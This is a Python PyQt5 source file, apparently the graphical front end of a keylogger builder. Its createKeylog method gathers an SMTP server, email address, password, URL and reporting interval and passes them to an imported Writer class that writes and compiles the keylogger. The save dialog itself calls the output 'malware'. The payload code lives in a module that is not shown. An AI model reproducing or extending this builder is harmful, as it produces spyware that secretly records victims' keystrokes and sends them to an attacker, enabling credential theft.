import sys
import pathlib
from modules.write_keylog import Writer
from PyQt5.QtCore import Qt
from PyQt5.uic import loadUi
from PyQt5.QtWidgets import QMainWindow, qApp, QFileDialog, QVBoxLayout, QLabel
from PyQt5.QtWidgets import QApplication, QStackedWidget, QGraphicsDropShadowEffect, QMessageBox
from PyQt5.QtGui import QColor


class Main(QMainWindow):

    def __init__(self):

        super().__init__()
        loadUi('ressources/main.ui', self)
        self.etat = 0
        self.exitButton.clicked.connect(qApp.quit)
        self.minimizeButton.clicked.connect(widget.showMinimized)
        self.maximizeButton.clicked.connect(self.maximizeominimize)
        self.validButton.clicked.connect(self.createKeylog)

        self.shadow = QGraphicsDropShadowEffect()
        self.shadow.setBlurRadius(45)
        self.shadow.setColor(QColor("#3585f7"))
        self.shadow.setXOffset(0)
        self.shadow.setYOffset(0)
        self.validButton.setGraphicsEffect(self.shadow)

    def maximizeominimize(self):

        if self.etat == 0:
            widget.showMaximized()
            self.etat = 1
        else:
            widget.showNormal()
            self.etat = 0

    def createKeylog(self):

        home_dir = str(pathlib.Path.home())
        fname = QFileDialog.getSaveFileName(self, 'Enregistrer le malware.', home_dir)
        print(fname[0])

        email = self.emailInput.text()
        interval = int(self.intervalInput.text())
        password = self.passwordInput.text()
        smtp = self.smtpInput.text()
        url = self.urlInput.text()

        writer = Writer(
            smtp_addr=smtp,
            interval=interval,
            email=email,
            password=password,
            url=url,
            path=fname[0]
        )

        writer.write_keylogger()
        writer.compile_keylog()

if __name__ == "__main__":

    app = QApplication(sys.argv)
    widget = QStackedWidget()
    main = Main()
    widget.setWindowFlag(Qt.FramelessWindowHint)
    widget.setAttribute(Qt.WA_TranslucentBackground)
    widget.addWidget(main)
    widget.resize(900, 700)
    widget.show()
    sys.exit(app.exec())